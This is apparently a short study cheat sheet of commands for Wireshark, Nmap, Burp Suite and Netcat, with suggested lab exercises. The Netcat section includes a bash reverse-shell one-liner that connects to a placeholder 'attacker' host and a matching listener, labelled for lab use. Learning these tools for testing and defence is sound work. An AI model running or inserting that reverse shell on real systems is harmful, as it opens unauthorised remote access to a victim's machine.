# Hands-on Tools — Wireshark, Nmap, Burp Suite, Netcat

## Wireshark (packet capture)
- Start capture on interface; use display filters like `ip.addr == x.x.x.x` or `http`.
- Save as `.pcapng` and analyze protocols, follow TCP streams.

## Nmap (network scanning)
- `nmap -sS -Pn -sV target` — stealth SYN scan, no ping, service/version.
- `nmap -A target` — aggressive scan (OS, scripts).
- Use `-oN`/`-oX` to save output.

## Burp Suite (web proxy)
- Intercept HTTP(S) requests from a browser by configuring proxy (127.0.0.1:8080).
- Use Intruder, Repeater, and Scanner (Professional) for testing.

## Netcat (nc)
- Quick listeners: `nc -l 1234`
- Banner grabs: `echo -e "HEAD / HTTP/1.0\r\n\r\n" | nc host 80`
- File transfer: `nc -l 9000 > file` (receive) and `nc host 9000 < file` (send)
- Reverse shells (lab/testing only): `nc -l -p 4444` (attacker) and `bash -i >& /dev/tcp/attacker/4444 0>&1` (target)

## Practical exercise suggestions
- Capture an `nmap` scan in Wireshark and observe SYN, SYN-ACK, ACK sequences.
- Use Burp Repeater to manually modify HTTP parameters and observe server responses.
